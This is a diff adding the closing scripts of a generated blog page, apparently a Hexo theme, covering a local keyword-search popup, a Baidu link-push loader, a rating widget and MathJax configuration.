+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+  
+
+
+  
+
+  
+
+</body>
+</html>
